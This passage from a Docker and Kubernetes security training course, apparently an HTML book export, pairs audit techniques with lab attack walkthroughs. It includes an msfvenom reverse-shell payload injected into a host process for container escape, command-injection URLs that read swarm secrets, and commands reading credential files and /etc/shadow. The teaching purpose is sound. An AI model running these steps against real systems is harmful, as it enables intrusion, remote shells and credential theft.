<ul>
<li>Use the <code>2376</code> port for exposing if required to expose the Docker API. Otherwise use <code>fd</code> or <code>socket</code> to expose the docker runtime daemon</li>
</ul>
<h1><a class="header" href="#auditing-docker-containers-and-images" id="auditing-docker-containers-and-images">Auditing Docker containers and images</a></h1>
<ul>
<li><a href="docker-image-audit/../auditing-docker-containers/docker-images-containers.html">Docker images and containers</a></li>
<li><a href="docker-image-audit/scenario.html">Scenario</a></li>
<li><a href="docker-image-audit/solution.html">Solution</a></li>
</ul>
<h1><a class="header" href="#auditing-docker-images-and-containers" id="auditing-docker-images-and-containers">Auditing Docker Images and Containers</a></h1>
<p>There are multiple checks we can perform to audit against the docker images and containers. Containers are nothing but running instances of an image. We can look at an images's configuration and options to find any issues or misconfigurations.</p>
<h2><a class="header" href="#checking-the-checksum-for-the-images" id="checking-the-checksum-for-the-images">Checking the checksum for the images</a></h2>
<pre><code class="language-bash">docker images --digests ubuntu
</code></pre>
<p><img src="auditing-docker-containers/images/docker-digest-images.png" alt="docker images digest" /></p>
<h2><a class="header" href="#checking-for-content-trust-to-get-signatures" id="checking-for-content-trust-to-get-signatures">Checking for content trust to get signatures</a></h2>
<ul>
<li>
<p>Content trust is disabled by default. To enable it, set the <code>DOCKER_CONTENT_TRUST</code> environment variable to 1</p>
</li>
<li>
<p>Checking the image issuers with <code>docker trust</code></p>
</li>
</ul>
<pre><code class="language-bash">docker trust inspect mediawiki --pretty
</code></pre>
<p><img src="auditing-docker-containers/images/docker-trust.png" alt="docker trust inspect" /></p>
<h2><a class="header" href="#looking-for-known-vulnerabilities" id="looking-for-known-vulnerabilities">Looking for known vulnerabilities</a></h2>
<ul>
<li>
<p>Most of the containers in dockerhub use base containers. If those aren't updated frequently, then known vulnerabilities might exist in them </p>
</li>
<li>
<p>We can use docker hub registry scanning, clair (Vulnerability Static Analysis for Containers) to check for vulnerable packages in images</p>
</li>
<li>
<p>Let's now check for the known vulnerabilities for old docker images using <a href="https://vulners.com/audit">vulners audit</a></p>
</li>
</ul>
<p><img src="auditing-docker-containers/images/vulners-audit-site.png" alt="vulners audit site" /></p>
<blockquote>
<p>Vulners audit tool provides you with the ability to easily check the OS for vulnerable packages. Select your OS type, version and paste the list of installed packages to identify the vulnerable software.</p>
</blockquote>
<pre><code class="language-bash">docker run --rm -it 71aa5f3f90dc bash

cat /etc/issue

dpkg-query -W -f='${Package} ${Version} ${Architecture}\n'
</code></pre>
<p><img src="auditing-docker-containers/images/docker-image-packages-query.png" alt="docker query packages" /></p>
<ul>
<li>Now, we will paste these packages in the vulners and see the list of known vulnerabilities</li>
</ul>
<p><img src="auditing-docker-containers/images/knwon-vulnerabilities.png" alt="known vulnerabilities" /></p>
<h3><a class="header" href="#vulnerability-scan-using-trivy" id="vulnerability-scan-using-trivy">Vulnerability Scan using Trivy</a></h3>
<blockquote>
<p><a href="https://github.com/aquasecurity/trivy">Trivy</a> can also be used for running vulnerability scan on docker images.</p>
</blockquote>
<pre><code>docker run --rm \
  -v ~/.cache:/root/.cache/ \
  -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy ubuntu
</code></pre>
<h2><a class="header" href="#checking-for-metadata-secrets-and-environment-variables" id="checking-for-metadata-secrets-and-environment-variables">Checking for metadata, secrets and environment variables</a></h2>
<ul>
<li>We can check for these data using the <code>docker inspect</code> command on both images and containers</li>
</ul>
<pre><code class="language-bash">docker inspect &lt;image name&gt;
docker inspect &lt;container name&gt;
</code></pre>
<h1><a class="header" href="#docker-image-analysis---scenario" id="docker-image-analysis---scenario">docker image analysis - Scenario</a></h1>
<ul>
<li>Find out the backdoor (or) malicious command in this docker image by doing analysis</li>
</ul>
<pre><code class="language-bash">custom-htop
</code></pre>
<blockquote>
<p>Do this in the <code>student-vm</code></p>
</blockquote>
<h1><a class="header" href="#docker-image-analysis---solution" id="docker-image-analysis---solution">docker image analysis - Solution</a></h1>
<ul>
<li>Run the below command to show the history of a docker image. This will list the commands that were used for creating the image</li>
</ul>
<pre><code class="language-bash">docker history custom-htop
</code></pre>
<p><img src="docker-image-audit/images/docker-history.png" alt="docker history" /></p>
<h1><a class="header" href="#auditing-docker-networks-and-volumes" id="auditing-docker-networks-and-volumes">Auditing Docker networks and volumes</a></h1>
<ul>
<li><a href="docker-volumes-and-networks/../auditing-docker-containers/docker-volumes-networks.html">Docker volumes and networks</a></li>
<li><a href="docker-volumes-and-networks/scenario.html">Scenario</a></li>
<li><a href="docker-volumes-and-networks/solution.html">Solution</a></li>
</ul>
<h1><a class="header" href="#auditing-docker-volumes-and-networks" id="auditing-docker-volumes-and-networks">Auditing Docker Volumes and Networks</a></h1>
<h2><a class="header" href="#listing-and-inspecting-the-docker-volumes" id="listing-and-inspecting-the-docker-volumes">Listing and inspecting the docker volumes</a></h2>
<ul>
<li>Listing docker volumes</li>
</ul>
<pre><code class="language-bash">docker volume ls
</code></pre>
<p><img src="auditing-docker-containers/images/docker-volume-ls.png" alt="docker volume ls" /></p>
<ul>
<li>Inspecting docker volumes</li>
</ul>
<pre><code class="language-bash">docker volume inspect wordpress_db_data
</code></pre>
<p><img src="auditing-docker-containers/images/docker-volume-inspect.png" alt="docker volume inspect" /></p>
<ul>
<li>Volumes can be used with Ready-Only, Read-Write modes</li>
</ul>
<h2><a class="header" href="#listing-and-inspecting-the-docker-networks" id="listing-and-inspecting-the-docker-networks">Listing and inspecting the docker networks</a></h2>
<ul>
<li>
<p>Docker by default creates it's own networking namespace when we use Docker Swarm or Docker Compose</p>
</li>
<li>
<p>By default bridge, host, null networking options are available</p>
</li>
<li>
<p>Listing the docker networks</p>
</li>
</ul>
<pre><code class="language-bash">docker network ls
</code></pre>
<p><img src="auditing-docker-containers/images/docker-network-ls.png" alt="docker network ls" /></p>
<ul>
<li>Inspecting the docker network</li>
</ul>
<pre><code class="language-bash">docker inspect wordpress_default
</code></pre>
<p><img src="auditing-docker-containers/images/docker-network-inspect.png" alt="docker network inspect" /></p>
<blockquote>
<p>We can use our traditional toolset like <code>nmap</code> (or) <code>nc</code> for performing scans and information gathering</p>
</blockquote>
<h1><a class="header" href="#docker-volumes---scenario" id="docker-volumes---scenario">Docker Volumes - Scenario</a></h1>
<ul>
<li>Identify the sensitive content in the docker volumes using volume analysis for volume <code>1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67</code></li>
</ul>
<h1><a class="header" href="#docker-volumes---solution" id="docker-volumes---solution">Docker Volumes - Solution</a></h1>
<ul>
<li>Inspecting docker volumes</li>
</ul>
<pre><code class="language-bash">docker volume inspect 1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67
</code></pre>
<p><img src="docker-volumes-and-networks/images/docker-volume-inspect.png" alt="docker volume inspect" /></p>
<ul>
<li>Looking for sensitive data and secrets</li>
</ul>
<pre><code class="language-bash">sudo -i
cd /var/lib/docker/volumes/1e030154f4952361cec6c21e838a0fb617c7b7cc6359570407eb9f697b229b67/_data
ls
grep -i 'flag' wp-config.php
grep -i 'password' wp-config.php
</code></pre>
<p><img src="docker-volumes-and-networks/images/docker-volumes-data.png" alt="looking for data in volumes" /></p>
<h1><a class="header" href="#docker-integrity-check-for-containers" id="docker-integrity-check-for-containers">Docker integrity check for containers</a></h1>
<ul>
<li>We can list the changed files and directories in a containers filesystem</li>
<li>There are 3 events that are listed in the diff
<ul>
<li>A - Add</li>
<li>D - Delete</li>
<li>C - Change</li>
</ul>
</li>
</ul>
<h2><a class="header" href="#demonstration" id="demonstration">Demonstration</a></h2>
<ul>
<li>Let's run a ubuntu container and perform some changes</li>
</ul>
<pre><code class="language-bash">docker run --name checkintegriy  -it ubuntu:latest bash
mkdir -p /data/output
echo &quot;modifed this stuff&quot; &gt; /.dockerenv
exit
</code></pre>
<p><img src="auditing-docker-containers/images/docker-perform-changes.png" alt="docker perfrom changes" /></p>
<ul>
<li>Now lets see the diff using the following command</li>
</ul>
<pre><code class="language-bash">docker diff checkintegriy
</code></pre>
<p><img src="auditing-docker-containers/images/docker-diff-changes.png" alt="" /></p>
<h1><a class="header" href="#amicontained" id="amicontained">amicontained</a></h1>
<p>This is a container introspection tool that lets you find out what container runtime is being used as well as the features available.</p>
<ul>
<li>Docker container running with no privileges</li>
</ul>
<pre><code class="language-bash">docker run --rm -it r.j3ss.co/amicontained -d
</code></pre>
<p><img src="auditing-docker-containers/images/docker-no-privileges.png" alt="docker no privileges" /></p>
<ul>
<li>Docker container running with host privileges</li>
</ul>
<pre><code class="language-bash">docker run --rm -it --pid host r.j3ss.co/amicontained -d
</code></pre>
<p><img src="auditing-docker-containers/images/docker-host-privileges.png" alt="docker host privileges" /></p>
<ul>
<li>Docker container running with apparmor profile security options</li>
</ul>
<pre><code class="language-bash">docker run --rm -it --security-opt &quot;apparmor=unconfined&quot; r.j3ss.co/amicontained -d
</code></pre>
<p><img src="auditing-docker-containers/images/docker-apparmor-profile.png" alt="docker apparmor profile" /></p>
<h1><a class="header" href="#attacking--auditing-docker-runtime--registries" id="attacking--auditing-docker-runtime--registries">Attacking &amp; Auditing Docker Runtime &amp; Registries</a></h1>
<ul>
<li><a href="attacking-auditing-docker-registry/../auditing-docker-containers/docker-runtime-endpoints.html">Docker runtime endpoints</a></li>
<li><a href="attacking-auditing-docker-registry/docker-registries.html">Docker registries</a></li>
</ul>
<h1><a class="header" href="#auditing-docker-runtime-and-endpoints" id="auditing-docker-runtime-and-endpoints">Auditing Docker Runtime and Endpoints</a></h1>
<ul>
<li>Checking for the docker daemon configuration</li>
</ul>
<pre><code class="language-bash">docker system info
</code></pre>
<p><img src="auditing-docker-containers/images/docker-system-info.png" alt="docker system info" /></p>
<ul>
<li>Checking for the docker API exposed on <code>0.0.0.0</code></li>
</ul>
<pre><code class="language-bash">sudo cat /lib/systemd/system/docker.service
</code></pre>
<p><img src="auditing-docker-containers/images/docker-tcp-socket.png" alt="docker using tcp socket" /></p>
<ul>
<li>Checking if the docker socket is mounted to any running container</li>
</ul>
<pre><code class="language-bash">docker inspect | grep -i '/var/run/'
</code></pre>
<p><img src="auditing-docker-containers/images/docker-inspect-for-socket.png" alt="docker inspect for socket" /></p>
<ul>
<li>Checking other files and data related to docker</li>
</ul>
<pre><code class="language-bash">sudo ls -l /var/lib/docker/
</code></pre>
<p><img src="auditing-docker-containers/images/docker-data-files.png" alt="docker system files and data" /></p>
<h1><a class="header" href="#auditing-docker-registries" id="auditing-docker-registries">Auditing Docker Registries</a></h1>
<p>A Docker registry is a distribution system for Docker images. There will be different images and each may contain multiple tags and versions. By default the registry runs on port <code>5000</code> without authentication and TLS.</p>
<p>In this section, we will be using a simple unauthenticated docker private registry to perform security audit.</p>
<ul>
<li>We can check if the docker registry is up by running the following command in the student VM</li>
</ul>
<pre><code class="language-bash">curl -s http://localhost:5000/v2/_catalog | jq .
</code></pre>
<p><img src="attacking-auditing-docker-registry/images/docker-registry-access.png" alt="docker registry access" /></p>
<ul>
<li>Get the list of tags and versions of a docker image from the registry</li>
</ul>
<pre><code class="language-bash">curl -s http://localhost:5000/v2/devcode/tags/list | jq .
</code></pre>
<p><img src="attacking-auditing-docker-registry/images/docker-registry-access-image.png" alt="docker image tags list" /></p>
<ul>
<li>Downloading a registry image locally</li>
</ul>
<pre><code class="language-bash">docker pull localhost:5000/devcode:latest
</code></pre>
<p><img src="attacking-auditing-docker-registry/images/download-image-locally.png" alt="download image locally" /></p>
<ul>
<li>Reviewing the container for sensitive data and hard-coded secrets</li>
</ul>
<pre><code class="language-bash">docker run --rm -it localhost:5000/devcode:latest sh

cat /.aws/credentials
</code></pre>
<p><img src="attacking-auditing-docker-registry/images/docker-analysis-secrets.png" alt="docker secrets analysis" /></p>
<ul>
<li>Lets check the default docker daemon configuration. This prints the default username and registry used by the docker run time</li>
</ul>
<pre><code>docker system info
</code></pre>
<p><img src="attacking-auditing-docker-registry/images/docker-system-info-registries.png" alt="docker system info registries" /></p>
<ul>
<li>Lets look for the configured registries from the host. The credentials may authorize us to pull and/or push images to the registry</li>
</ul>
<pre><code>cat ~/.docker/config.json
</code></pre>
<p><img src="attacking-auditing-docker-registry/images/docker-registry-config-secrets.png" alt="docker registry config secrets" /></p>
<h1><a class="header" href="#attacking-container-capabilities" id="attacking-container-capabilities">Attacking container capabilities</a></h1>
<ul>
<li><a href="attacking-containers-capabilities/scenario.html">Scenario</a></li>
<li><a href="attacking-containers-capabilities/solution.html">Solution</a></li>
</ul>
<h1><a class="header" href="#attacking-container-capabilities---scenario" id="attacking-container-capabilities---scenario">Attacking Container Capabilities - Scenario</a></h1>
<p>In this scenario we will exploit a container with <code>sys_ptrace</code> capability running with host <code>PID</code> namespace. We will exploit these to breakout of the container and access the host system. We assume that the attacker already has access to the container for this scenario.</p>
<ul>
<li>Login to the container using below command. Ensure that you run this in the <code>CTF</code> vm </li>
</ul>
<pre><code class="language-bash">docker exec -it sysmon bash
</code></pre>
<p><img src="attacking-containers-capabilities/images/sysmon-access.png" alt="docker exec into sysmon" /></p>
<h1><a class="header" href="#attacking-container-capabilities---solution" id="attacking-container-capabilities---solution">Attacking Container Capabilities - Solution</a></h1>
<ul>
<li>Login to the container using below command. Ensure that you run this in the <code>CTF</code> vm </li>
</ul>
<pre><code class="language-bash">docker exec -it sysmon bash
</code></pre>
<p><img src="attacking-containers-capabilities/images/sysmon-access.png" alt="docker exec into sysmon" /></p>
<ul>
<li>Check for existing capabilities by running <code>capsh --print</code></li>
</ul>
<p><img src="attacking-containers-capabilities/images/sysmon-capsh.png" alt="capsh print" /></p>
<ul>
<li>Also the container has enabled <code>--pid=host</code> so we can access then host process using <code>top</code> command</li>
</ul>
<p><img src="attacking-containers-capabilities/images/sysmon-top.png" alt="top command" /></p>
<blockquote>
<p>Since an attacker can list host processes and has the <code>sys_ptrace</code> capability. Attacker can exploit this scenario to inject and execute code from the address space of any host process. This effectively results in a docker escape as the attacker can execute code outside the container.</p>
</blockquote>
<h2><a class="header" href="#steps-to-attack" id="steps-to-attack">Steps to attack</a></h2>
<ul>
<li>Generate reverse shell payload using metasploit's <code>msfvenom</code> program. Replace the <code>192.168.56.3</code> with student vm IP address.</li>
</ul>
<pre><code class="language-bash">cd /home/student/linux-injector

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f raw -o payload.bin
</code></pre>
<p><img src="attacking-containers-capabilities/images/sysmon-msfvenom-generate.png" alt="msfvenom generate" /></p>
<ul>
<li>Send the exploit and injector program to the container using simple python server. Run the below command in student vm</li>
</ul>
<pre><code class="language-bash">cd /home/student
tar -czf linux-injector.tar.gz linux-injector
python -m SimpleHTTPServer 8002
</code></pre>
<p><img src="attacking-containers-capabilities/images/sysmon-start-python-server.png" alt="start python server" /></p>
<ul>
<li>Download the payload in the ctf vm container. Run the below command in the CTF vm and inside the <code>sysmon</code> container. Ensure you replace the <code>192.168.56.3</code> with your student vm IP</li>
</ul>
<pre><code class="language-bash">curl -o linux-injector.tar.gz http://192.168.56.3:8002/linux-injector.tar.gz
tar xzf linux-injector.tar.gz
cd linux-injector
chmod 755 injector
</code></pre>
<p><img src="attacking-containers-capabilities/images/sysmon-download-payload.png" alt="download the payload" /></p>
<ul>
<li>Start the <code>nc</code> listener to receive the connect back shell in student vm. Run the following command in student VM</li>
</ul>
<pre><code class="language-bash">nc -lvp 4444
</code></pre>
<p><img src="attacking-containers-capabilities/images/start-nc-listener.png" alt="start nc listener" /></p>
<ul>
<li>Now identify the process, which is running as <code>root</code> in the host system to gain root access for connect back. Run the following command inside CTF vm <code>sysmon</code> container</li>
</ul>
<pre><code class="language-bash">ps auxx | grep root | grep ping
</code></pre>
<p><img src="attacking-containers-capabilities/images/sysmon-payload-execution.png" alt="sysmon payload execution" /></p>
<pre><code class="language-bash">./injector 2046 payload.bin
</code></pre>
<ul>
<li>On successful injection of payload, we get a reverse connection at our listener with access to host system outside the container</li>
</ul>
<p><img src="attacking-containers-capabilities/images/sysmon-access-host-flag.png" alt="got access to host system flag" /></p>
<h1><a class="header" href="#lsm---apparmor-nginx-profile" id="lsm---apparmor-nginx-profile">LSM - Apparmor Nginx Profile</a></h1>
<p>The Linux Security Module (LSM) framework provides a mechanism for various security checks to be hooked by new kernel extensions.</p>
<p>The primary users of the LSM interface are Mandatory Access Control (MAC) extensions which provide a comprehensive security policy. Examples include SELinux, Smack, Tomoyo, and AppArmor.</p>
<h2><a class="header" href="#demonstration-1" id="demonstration-1">Demonstration</a></h2>
<ul>
<li>Let's run a simple nginx container</li>
</ul>
<pre><code class="language-bash">docker run --rm -it --name lsm-before -p 4321:80 nginx bash

sh
dash
bash
</code></pre>
<p><img src="apparmor-nginx-profile/images/lsm-before.png" alt="lsm before nginx" /></p>
<ul>
<li>Now lets apply the apparmor profile for the container and see if we can perform other operations like <code>sh</code> and <code>dash</code></li>
</ul>
<pre><code class="language-bash">cd /opt/docker-nginx

sudo bane sample.toml 

docker run --rm -it --name lsm-after \
    --security-opt=&quot;apparmor:docker-nginx-sample&quot; -p 4320:80 nginx bash

sh
dash
bash
</code></pre>
<p><img src="apparmor-nginx-profile/images/lsm-after.png" alt="lsm after nginx" /></p>
<ul>
<li>Have a look at <code>cat /opt/docker-nginx/docker-nignx-sample</code> file for the apparmor profile that was created using <a href="https://github.com/genuinetools/bane">bane</a></li>
</ul>
<h1><a class="header" href="#attacking-swarm-cluster-secrets" id="attacking-swarm-cluster-secrets">Attacking swarm cluster secrets</a></h1>
<ul>
<li><a href="exploiting-cluster-secrets/scenario.html">Scenario</a></li>
<li><a href="exploiting-cluster-secrets/solution.html">Solution</a></li>
</ul>
<h1><a class="header" href="#exploiting-cluster-secrets" id="exploiting-cluster-secrets">Exploiting Cluster Secrets</a></h1>
<p>In this scenario we will see how we will exploit an application to access docker swarm cluster secrets.</p>
<ul>
<li>The application running in the CTF VM has code execution vulnerability <code>http://CTFVMIP:8080/?domain=;id</code> and is running in docker swarm with secrets attached</li>
</ul>
<h1><a class="header" href="#exploiting-cluster-secrets-1" id="exploiting-cluster-secrets-1">Exploiting Cluster Secrets</a></h1>
<ul>
<li>The application running in the CTF VM has code execution vulnerability <code>http://CTFVMIP:8080/?domain=;id</code> and is running in docker swarm as service with attached secrets</li>
</ul>
<p><img src="exploiting-cluster-secrets/images/access-docker-swarm-app.png" alt="accessing the docker swarm app" /></p>
<ul>
<li>We can access the application container's environment variables using the <code>printenv</code> command by visiting <code>http://CTFVMIP:8080/?domain=;printenv</code></li>
</ul>
<p><img src="exploiting-cluster-secrets/images/access-docker-swarm-env.png" alt="access docker swarm environment variables" /></p>
<ul>
<li>We can explore the directories further <code>http://CTFVMIP:8080/?domain=;ls -l /run/</code></li>
</ul>
<p><img src="exploiting-cluster-secrets/images/docker-swarm-search-locations.png" alt="docker swarm app search locations" /></p>
<ul>
<li>The secrets are mounted via <code>docker secrets</code> at <code>/var/run/</code> or <code>/run/</code>. We can access them by visiting <code>http://CTFVMIP:8080/?domain=;cat /run/secrets/data_api_key</code></li>
</ul>
<p><img src="exploiting-cluster-secrets/images/docker-secrets-default-location.png" alt="docker secret access data" /></p>
<ul>
<li>A similar approach can be user for <code>docker swarm</code> and <code>kubernetes</code> cluster environments</li>
</ul>
<h1><a class="header" href="#attacking-private-registry-images" id="attacking-private-registry-images">Attacking private registry images</a></h1>
<ul>
<li><a href="attacking-private-registry/scenario.html">Scenario</a></li>
<li><a href="attacking-private-registry/solution.html">Solution</a></li>
</ul>
<h1><a class="header" href="#attacking-private-registry---scenario" id="attacking-private-registry---scenario">Attacking Private Registry - Scenario</a></h1>
<p>Organization hosting their infrastructure in containers with help of orchestration and clustering. Organization uses automated deployments using continuous integration and continuous delivery. All the containers will be stored in centralized private registry. Identify the sensitive information from the registry.</p>
<h3><a class="header" href="#target" id="target">Target</a></h3>
<p>165.22.221.65</p>
<h1><a class="header" href="#attacking-private-registry---solution" id="attacking-private-registry---solution">Attacking Private Registry - Solution</a></h1>
<ul>
<li>Understanding the API structure of the docker private registry to list of images</li>
</ul>
<pre><code class="language-bash">curl 165.22.221.65:5000/v2/_catalog
</code></pre>
<ul>
<li>Get the list of tags for the images</li>
</ul>
<pre><code class="language-bash">curl 165.22.221.65:5000/v2/privatecode/tags/list
</code></pre>
<p><img src="attacking-private-registry/images/private-registry-list.png" alt="List images with tags in private registry" /></p>
<ul>
<li>Add the insecure-registry flag to download docker image at <code>vi /lib/systemd/system/docker.service</code></li>
</ul>
<pre><code class="language-bash">ExecStart=/usr/bin/dockerd -H fd:// --insecure-registry 165.22.221.65:5000
</code></pre>
<ul>
<li>Then restart the service</li>
</ul>
<pre><code class="language-bash">sudo systemctl daemon-reload
sudo service docker restart
</code></pre>
<ul>
<li>Download the image from private registry</li>
</ul>
<pre><code class="language-bash">docker pull 165.22.221.65:5000/privatecode:golang-developer-team
</code></pre>
<p><img src="attacking-private-registry/images/pull-docker.png" alt="pulling docker image" /></p>
<ul>
<li>Enter into the container using the below command. Look for interesting file and folders</li>
</ul>
<pre><code class="language-bash">docker run --rm -it 165.22.221.65:5000/privatecode:golang-developer-team sh

cd /app
ls -la
</code></pre>
<p><img src="attacking-private-registry/images/enter-into-container.png" alt="entering into container for analysis" /></p>
<ul>
<li>Now look at the commit logs for git</li>
</ul>
<pre><code class="language-bash">git log
</code></pre>
<p><img src="attacking-private-registry/images/commit-log.png" alt="git commit logs" /></p>
<ul>
<li>Then revert to the commit where environment variables are there. Then look for files and secrets</li>
</ul>
<pre><code class="language-bash">git checkout f17a07721ab9acec96aef0b1794ee466e516e37a

ls -la

cat .env
</code></pre>
<p><img src="attacking-private-registry/images/revert-and-secrets.png" alt="revert and look for secrets" /></p>
<h1><a class="header" href="#docker-bench-security-audit" id="docker-bench-security-audit">Docker Bench Security Audit</a></h1>
<p>Docker Bench for Security is a shell script to perform multiple checks against the Docker container environment. It will give a detailed view of the security configuration based on CIS benchmarks. This script supports most of the Unix operating systems as it was built based on the POSIX 2004 compliant.</p>
<p>More details about the tool information can be found at https:/​/github.​com/​docker/docker-​bench-​security</p>
<p>The following are the high-level areas of checks this script will perform</p>
<ul>
<li>Host configuration</li>
<li>Docker daemon configuration and files</li>
<li>Docker container images</li>
<li>Docker runtime</li>
<li>Docker security operations</li>
<li>Docker swarm configuration</li>
</ul>
<h2><a class="header" href="#running-docker-bench-security" id="running-docker-bench-security">Running docker bench security</a></h2>
<p>Now lets perform the audit</p>
<pre><code class="language-bash">cd /opt/docker-bench-security
sudo bash docker-bench-security.sh
</code></pre>
<p><img src="auditing-docker-containers/images/docker-bench-security.png" alt="Docker Bench Security" /></p>
<h1><a class="header" href="#container-security-monitoring" id="container-security-monitoring">Container Security Monitoring</a></h1>
<ul>
<li><a href="csm/../docker-logging/README.html">Docker logging</a></li>
<li><a href="csm/../docker-events/README.html">Docker Events</a></li>
<li><a href="csm/../sysdig-faclo/README.html">Sysdig Faclo</a></li>
</ul>
<h1><a class="header" href="#docker-logging" id="docker-logging">Docker Logging</a></h1>
<p>The <code>docker logs</code> command shows information logged by a running container. The <code>docker service logs</code> command shows information logged by all containers participating in a service. The information that is logged and the format of the log depends almost entirely on the container's endpoint command.</p>
<h2><a class="header" href="#examples" id="examples">Examples</a></h2>
<ul>
<li>Fetch the logs of a container</li>
</ul>
<pre><code class="language-bash">docker logs containername

# follow the stream
docker logs -f containername
</code></pre>
<ul>
<li>Retrieve logs until a specific point in time</li>
</ul>
<pre><code class="language-bash">docker run --name testlogs -d ubuntu sh -c &quot;while true; do $(echo date); sleep 1; done&quot;

date
Mon Oct  1 17:12:27 IST 2018

docker logs -f --until=2s testlogs
Mon Oct  1 11:41:36 UTC 2018
Mon Oct  1 11:41:37 UTC 2018
Mon Oct  1 11:41:38 UTC 2018
</code></pre>
<p><img src="docker-logging/images/docker-logs-with-filters.png" alt="docker logs with filters" /></p>
<h3><a class="header" href="#reference" id="reference">Reference</a></h3>
<ul>
<li><a href="https://docs.docker.com/v17.12/engine/reference/commandline/logs/">docker logs</a></li>
<li><a href="https://medium.com/@yoanis_gil/logging-with-docker-part-1-b23ef1443aac">Logging with Docker</a></li>
</ul>
<h1><a class="header" href="#docker-events" id="docker-events">Docker Events</a></h1>
<p>Docker events generates real time events from the server.</p>
<ul>
<li>Looking for the global events generated by the docker runtime</li>
</ul>
<pre><code class="language-bash">docker system events
</code></pre>
<p><img src="docker-events/images/docker-system-events.png" alt="docker system events" /></p>
<ul>
<li>Filter events based on time</li>
</ul>
<pre><code class="language-bash">docker events --since '10m'
</code></pre>
<ul>
<li>Filter events based on images image</li>
</ul>
<pre><code class="language-bash">docker events --filter 'image=alpine'
</code></pre>
<ul>
<li>Filter events based on </li>
</ul>
<pre><code class="language-bash">docker events --filter 'event=stop'
</code></pre>
<h3><a class="header" href="#references-3" id="references-3">References</a></h3>
<ul>
<li><a href="https://docs.docker.com/engine/reference/commandline/events/">docker events</a></li>
<li><a href="http://crosbymichael.com/docker-events.html">Using docker events with code</a></li>
</ul>
<h1><a class="header" href="#sysdig-falco" id="sysdig-falco">Sysdig Falco</a></h1>
<p>Sysdig Falco is an open source container runtime security. It is a behavioral monitoring software designed to detect anomalous activity. Sysdig Falco works as a intrusion detection system on any Linux host, although it is particularly useful when using Docker since it supports container-specific context like <code>container.id</code>, <code>container.image</code> or <code>namespaces</code> for its rules.</p>
<h2><a class="header" href="#sysdig-falco-logging-for-containers" id="sysdig-falco-logging-for-containers">Sysdig Falco Logging for Containers</a></h2>
<ul>
<li>Run the following command in student VM</li>
</ul>
<pre><code class="language-bash">sudo falco
</code></pre>
<p><img src="sysdig-faclo/images/sysdig-falco-start.png" alt="start sysdig falco" /></p>
<ul>
<li>Then start another container and perform operations like executing shell, reading shadow file, etc.</li>
</ul>
<pre><code class="language-bash">docker exec -it registry sh
cat /etc/passwd
cat /etc/shadow
</code></pre>
<p><img src="sysdig-faclo/images/container-and-commands.png" alt="Running the container and commands" /></p>
<h2><a class="header" href="#falco-attack-detection-based-on-ruleset" id="falco-attack-detection-based-on-ruleset">Falco attack detection based on ruleset</a></h2>
<p><img src="sysdig-faclo/images/falco-detection.png" alt="faclo detection" /></p>
<h2><a class="header" href="#play-with-sysdig-falco-scenario" id="play-with-sysdig-falco-scenario">Play with Sysdig Falco Scenario</a></h2>
<p><img src="sysdig-faclo/images/sysdig-falco-scenario.png" alt="Sysdig Faclo Scenario" /></p>
<p><a href="https://www.katacoda.com/mateobur/scenarios/falco">Sysdig Falco: Container security monitoring</a></p>
<h1><a class="header" href="#kubernetes-environment-setup" id="kubernetes-environment-setup">Kubernetes Environment Setup</a></h1>
<ul>
<li><a href="getting-started/kubernetes-cluster-setup.html">Cluster Setup</a></li>
<li><a href="getting-started/import-vm.html">Import VM</a></li>
<li><a href="getting-started/configure-kubectl.html">Configure kubectl</a></li>
<li><a href="getting-started/vuln-apps.html">Vulnerable Apps</a></li>
</ul>
<h1><a class="header" href="#kubernetes-cluster-setup" id="kubernetes-cluster-setup">Kubernetes Cluster Setup</a></h1>
<p>We will setup a Kubernetes cluster in Google Cloud. For this, you will require:</p>
<ol>
<li>Google Cloud account</li>
<li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">kubectl</a></li>
<li><a href="https://v2.helm.sh/docs/install/">Helm 2</a></li>
<li><a href="https://cloud.google.com/sdk/install">gcloud</a></li>
</ol>
<ul>
<li>Ensure <code>gcloud</code> is configured and able to access your Google Cloud account. This can be verified using</li>
</ul>
<pre><code>gcloud projects lists
</code></pre>
<ul>
<li>Ensure you have <code>helm2</code> symlink pointing to the Helm v2.x binary. The setup script uses <code>helm2</code> to invoke Helm v2.</li>
</ul>
<blockquote>
<p><strong>NOTE:</strong> Setting up a cluster in Google cloud may incur cost. Refer to <code>setup.sh</code> on the resources created.</p>
</blockquote>
<h2><a class="header" href="#create-cluster" id="create-cluster">Create Cluster</a></h2>
<pre><code>export STUDENTPROJECTNAME=&quot;Google-Cloud-Project-Name&quot;
./setup.sh
</code></pre>
<blockquote>
<p>The cluster creation script <code>setup.sh</code> will generate a script <code>destroy.sh</code> that can be used to delete the resources created on Google cloud</p>
</blockquote>
<p>The <code>setup.sh</code> will</p>
<ol>
<li>Create a Kubernetes cluster on Google cloud using <code>gcloud</code></li>
<li>Allocate a static IP address for Ingress</li>
<li>Deploy vulnerable apps and config</li>
<li>Generate <code>kubeconfig</code> file in current directory</li>
<li>Generate <code>destroy.sh</code> script to destroy [1] and [2]</li>
</ol>
<h2><a class="header" href="#expose-vulnerable-apps" id="expose-vulnerable-apps">Expose Vulnerable Apps</a></h2>
<pre><code>sudo kubectl port-forward -n kube-system svc/nginx-ingress-controller 80:80
</code></pre>
<p>The default ingress <code>app-ingress/app-ingress.yml</code> uses host names that resolves to <code>127.0.0.1</code>. The above command will forward port 80 on localhost to the <code>Nginx Ingress</code> service running inside the cluster.</p>
<h2><a class="header" href="#destroy-cluster" id="destroy-cluster">Destroy Cluster</a></h2>
<pre><code>./destroy.sh
</code></pre>
<h1><a class="header" href="#download-kubernetes-student-vm" id="download-kubernetes-student-vm">Download Kubernetes Student VM</a></h1>
<ul>
<li>http://www.mediafire.com/file/b739545szyrc6i5/kubernetes-security.ova/file</li>
<li>http://www.mediafire.com/file/asz5xukxg1lhs3r/kubernetes-security.ova.checksum/file</li>
</ul>
<h1><a class="header" href="#import-vm" id="import-vm">Import VM</a></h1>
<ul>
<li>
<p>Click on Virtual Box <code>File</code> -&gt; <code>Import</code></p>
</li>
<li>
<p>Browse to the ova of k8s-security and import the file
<img src="getting-started/images/select-import.png" alt="" /></p>
</li>
<li>
<p>Click on Import
<img src="getting-started/images/import.png" alt="" /></p>
</li>
</ul>
<p><img src="getting-started/images/process.png" alt="" /></p>
<ul>
<li>Login to the vm using below credentials</li>
</ul>
